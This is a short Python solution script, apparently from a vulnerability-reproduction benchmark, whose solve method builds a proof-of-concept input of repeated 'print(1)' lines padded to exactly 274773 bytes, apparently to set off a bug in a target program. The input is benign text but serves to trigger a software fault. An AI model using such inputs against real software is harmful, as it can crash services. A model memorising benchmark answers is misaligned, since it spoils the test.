class Solution:
    def solve(self, src_path: str) -> bytes:
        pattern = b"print(1)\n"
        target_length = 274773
        num_repeats = target_length // len(pattern)
        poc = pattern * num_repeats
        remaining = target_length - len(poc)
        if remaining > 0:
            poc += pattern[:remaining]
        return poc